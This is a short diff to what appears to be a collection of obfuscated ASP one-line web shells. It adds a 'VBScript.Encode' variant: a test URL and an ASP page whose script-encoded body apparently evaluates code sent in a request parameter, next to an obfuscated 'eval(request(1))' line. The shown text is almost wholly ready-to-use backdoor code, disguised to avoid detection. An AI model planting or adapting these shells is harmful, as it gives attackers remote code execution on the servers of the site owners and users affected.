@@ -105,5 +105,13 @@ e+j-v+j-a+j-l(request(1))
 %>
 ```
 
+
+#### VBScript.Encode
+http://127.0.0.1/1.asp?1=response.write(1)
+```
+<%@ LANGUAGE = "VBScript.Encode"%>
+<%#@~^EAAAAA==n7lsvD;E/DcF*#hAUAAA==^#~@%>
+```
+
 # 参考
 新仙剑之鸣、LandGrey
